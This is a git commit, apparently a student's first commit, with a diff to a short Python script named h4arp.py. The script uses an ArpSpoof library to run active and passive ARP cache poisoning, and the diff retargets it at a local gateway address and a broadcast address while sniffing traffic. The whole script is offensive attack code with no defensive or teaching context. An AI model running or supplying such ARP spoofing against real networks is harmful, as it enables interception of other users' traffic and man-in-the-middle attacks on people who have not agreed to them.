fbb592df84ca4470a995903b60756afd2f97f9ed
zeynepnlt <zsudenalbant@stu.aydin.edu.tr>
2025-03-15 23:30:02 +0300

    first commit

--- h4arp.py
+++ h4arp.py
@@ -1,9 +1,9 @@
 from ArpSpoof import SpooferARP
 
-spoofer = SpooferARP('10.110.0.1', '244.0.0.22')
+spoofer = SpooferARP('192.168.1.1', '192.168.1.255')
 spoofer.active_cache_poisonning()
 
-spoofer = SpooferARP('10.110.0.1', '244.0.0.22', conf.iface, False, 0.5)
+spoofer = SpooferARP('192.168.1.1', '192.168.1.255', conf.iface, False, 0.5)
 spoofer.passive_cache_poisonning(asynchronous=True)
 spoofer.run = False
 spoofer.sniffer.stop()                                   # only with asynchronous mode
